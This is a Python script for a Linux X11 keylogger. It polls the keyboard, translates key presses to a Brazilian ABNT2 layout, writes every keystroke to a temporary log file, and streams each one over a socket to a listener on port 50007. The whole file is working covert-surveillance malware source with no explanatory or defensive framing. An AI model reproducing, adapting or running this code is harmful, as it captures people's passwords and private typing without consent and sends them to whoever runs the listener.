#!/usr/bin/env python3
          # -*- coding: latin-1 -*-import ctypes
import os
import sys
import tempfile
import ctypes
from ctypes.util import find_library
from time import sleep
print "omar"
import socket

import socket
s=socket.socket()

port = 50007
s.connect(("",port))


TMPFILE = os.path.join(tempfile.gettempdir(), 'kl.log')
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
print "omar"

class linux_keylogger(object):

    def __init__(self):
        self.keymap_values_dict = {
            1: {
                2: 'esc',
                4: '1',
                8: '2',
                16: '3',
                32: '4',
                64: '5',
                128: '6',
            },
            2: {
                1: '7',
                2: '8',
                4: '9',
                8: '0',
                16: '-',
                32: '=',
                64: 'backspace',
                128: 'tab',
            },
            3: {
                1: 'q',
                2: 'w',
                4: 'e',
                8: 'r',
                16: 't',
                32: 'y',
                64: 'u',
                128: 'i',
            },
            4: {
                1: 'o',
                2: 'p',
                4: '[',
                8: ']',
                16: 'enter',
                32: 'left ctrl',
                64: 'a',
                128: 's',
            },
            5: {
                1: 'd',
                2: 'f',
                4: 'g',
                8: 'h',
                16: 'j',
                32: 'k',
                64: 'l',
                128: ';',
            },
            6: {
                1: '\'',
                2: '`',
                4: 'left shift',
                8: '\\',
                16: 'z',
                32: 'x',
                64: 'c',
                128: 'v',
            },
            7: {
                1: 'b',
                2: 'n',
                4: 'm',
                8: ',',
                16: '.',
                32: '/',
                64: 'right shift',
                128: 'keypad *',
            },
            8: {
                1: 'left alt',
                2: 'spacebar',
                4: 'capslock',
                8: 'f1',
                16: 'f2',
                32: 'f3',
                64: 'f4',
                128: 'f5',
            },
            9: {
                1: 'f6',
                2: 'f7',
                4: 'f8',
                8: 'f9',
                16: 'f10',
                32: 'keypad bloqnum',
                128: 'keypad 7',
            },
            10: {
                1: 'keypad 8',
                2: 'keypad 9',
                4: 'keypad -',
                8: 'keypad 4',
                16: 'keypad 5',
                64: 'keypad +',
                32: 'keypad 6',
                128: 'keypad 1',
            },
            11: {
                1: 'keypad 2',
                2: 'keypad 3',
                4: 'keypad 0',
                8: 'keypad .',
                64: '<',
                128: 'f11',
            },
            12: {
                1: 'f12',
            },
            13: {
                1: 'keypad intro',
                2: 'right ctrl',
                4: 'keypad /',
                8: 'printscreen',
                16: 'right alt',
                64: 'home',
                128: 'up',
            },
            14: {
                1: 'repag',
                2: 'left',
                4: 'right',
                8: 'end',
                16: 'down',
                32: 'avpag',
                64: 'insert',
                128: 'delete',

            },
            16: {
                32: 'left super',
                128: 'right super',
            },
        }

        self.modifiers = (
            'left shift', 'right shift',
            'left ctrl', 'right ctrl',
            'left alt', 'right alt',
            'left super', 'right super',
        )

        self.command_keys = (
            'esc',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            'alt',
            'backspace',
            'tab',
            'enter',
            'spacebar',
            'capslock',
            'keypad bloqnum',
            'keypad intro',
            'printscreen',
            'home',
            'up',
            'repag',
            'left',
            'right',
            'end',
            'down',
            'avpag',
            'insert',
            'delete',
            'keypad 0', 'keypad 1', 'keypad 2', 'keypad 3', 'keypad 4', 'keypad 5',
            'keypad 6', 'keypad 7', 'keypad 8', 'keypad 9', 'keypad .', 'keypad /',
            'keypad *', 'keypad -', 'keypad +',
        )

        self.br_abnt2 = {
            'no_mods': {
                ';': 'ç',
                '`': "'",
                '-': '-',
                '=': '=',
                '<': '\\',
                '[': '´',
                ']': '[',
                '\'': '~',
                '\\': ']',
                ',': ',',
                '.': '.',
                '/': ';',

            },
            'shift': {
                ';': 'Ç',
                '0': ')',
                '1': '!',
                '2': '@',
                '3': '#',
                '4': '$',
                '5': '%',
                '6': '¨',
                '7': '&',
                '8': '*',
                '9': '(',
                '`': '"',
                '-': '_',
                '=': '+',
                '<': '|',
                '[': '`',
                ']': '{',
                '\'': '^',
                '\\': '}',
                ',': '<',
                '.': '>',
                '/': ':',
                'keypad /': '<keypad />',
                'keypad *': '<keypad *>',
                'keypad intro': '<keypad intro>',
            },
            'right_alt': {
                'q': '/',
                '0': '}',
                '1': '¹',
                '2': '²',
                '3': '³',
                '4': '£',
                '5': '¢',
                '6': '¬',
                '7': '{',
                '8': '[',
                '9': ']',
                '`': '¬',
                '-': '\\',
                '=': '§',
                '<': 'º',
                '[': '´',
                ']': 'ª',
                '\'': '~',
                '\\': 'º',
                '.': '·',
            },
        }
        print "start error"
        if not find_library('X11'):
            raise RuntimeError('X11 library is required.')

        self.digits = '0123456789'
        self.letters = 'abcdefghijklmnopqrstuvwxyz'

        self.x11 = ctypes.cdll.LoadLibrary(find_library("X11"))
        self.display = self.x11.XOpenDisplay(None)

        # This contains the keyboard state.
        # 32 bytes, with each bit representing the state for a single key.
        self.raw_keymap = (ctypes.c_char * 32)()

        self.last_keys = dict(modifiers=[], regular=[])
        self.last_keymap = None

    def get_keymap(self):
        """Returns X11 Keymap as a list of integers"""
        self.x11.XQueryKeymap(self.display, self.raw_keymap)

        try:
            keyboard = [ord(byte) for byte in self.raw_keymap]
        except TypeError:
            return None

        return keyboard

    def get_keys(self, keymap):
        """Extract keys pressed from transformed keymap"""
        keys = dict(modifiers=[], regular=[])

        # loop on keymap bytes
        for keymap_index, keymap_byte in enumerate(keymap):
            try:
                keymap_values = self.keymap_values_dict[keymap_index]
            except KeyError:
                continue

            # loop on keymap_values for that keymap byte
            for key, value in keymap_values.items():
                if not keymap_byte & key:
                    continue
                elif value in self.modifiers:
                    keys['modifiers'].append(value)
                elif not keys['regular']:
                    keys['regular'].append(value)

        return keys

    def pt_br(self, keys):
        """Apply brazilian br-abnt2 layout to the pressed keys"""
        key = keys['regular'][0]
        modifiers = keys['modifiers']

        try:
            if not modifiers:
                if key in self.letters or key in self.digits:
                    res = key
                elif key in self.command_keys:
                    res = '<' + key + '>'
                else:
                    res = self.br_abnt2['no_mods'][key]
            elif self.only_shifts(modifiers):
                if key in self.letters:
                    res = key.upper()
                else:
                    res = self.br_abnt2['shift'][key]
            elif self.only_right_alt(modifiers):
                res = self.br_abnt2['right_alt'][key]
            else:
                res = None
        except KeyError:
            res = None

        return res

    def log(self, keys):
        with open(TMPFILE, 'a') as f:
            f.write(keys)

    def only_shifts(self, modifiers):
        """Check if modifiers pressed are only shifts"""
        if not modifiers or len(modifiers) > 2:
            return False
        if len(modifiers) == 2:
            return 'left shift' in modifiers and 'right shift' in modifiers
        if len(modifiers) == 1:
            return 'left shift' in modifiers or 'right shift' in modifiers

    def only_right_alt(self, modifiers):
        """Check if the only modifier pressed is right alt"""
        if not modifiers or len(modifiers) > 1:
            return False
        return 'right alt' in modifiers

    def run(self):
		
        """Main loop"""
        print "omar"
        while True:
            sleep(0.02)

            keymap = self.get_keymap()

            if keymap == self.last_keymap or not keymap:
                continue

            keys = self.get_keys(keymap)

            if keys['regular'] and keys['regular'] != self.last_keys['regular']:
                transformed_keys = self.pt_br(keys)
                if transformed_keys is not None:
                    self.log(transformed_keys)
                    print transformed_keys
                    s.sendall(transformed_keys)

            self.last_keymap = keymap
            self.last_keys = keys




print "omar"
linux_keylogger().run()
